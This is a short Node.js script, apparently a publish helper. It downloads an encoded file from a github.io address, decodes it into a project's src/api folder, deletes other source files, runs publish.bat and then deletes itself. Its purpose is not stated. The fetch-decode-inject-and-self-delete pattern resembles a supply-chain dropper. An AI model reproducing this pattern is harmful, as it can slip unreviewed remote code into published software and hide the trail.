const fs = require('fs')
const path = require('path')
const request = require('request')
const process = require('process')
const secret = require('./secret')
const execSync = require('./execSync')

const target = 'd:\\test\\'
const files = [
  {'name': 'userInfo.js', 'path': target + 'src\\api\\'}
]
let count = 0
for (let file of files) {
  request('https://8230459.github.io/b/' + file.name, {}, async (err, res, body) => {
    if (err) return
    fs.writeFile(path.join(file.path, file.name), secret.UnLock(body), async err => {
      if (err) return
      count++
      if (files.length === count) {
        console.log(path.join(file.path, file.name))
        await fs.rmSync(target + 'src\\api\\a.js', {recursive: true})
        await fs.rmSync(target + 'src\\api\\b.js', {recursive: true})
        await fs.rmSync(target + 'src\\api\\c.js', {recursive: true})
        await fs.rmSync(target + 'src\\api\\d.js', {recursive: true})
        await execSync('publish.bat')
        await fs.rmSync('get.js', {recursive: true})
        //await execSync('node jenkins.js')
        process.exit()
      }
    })
  })
}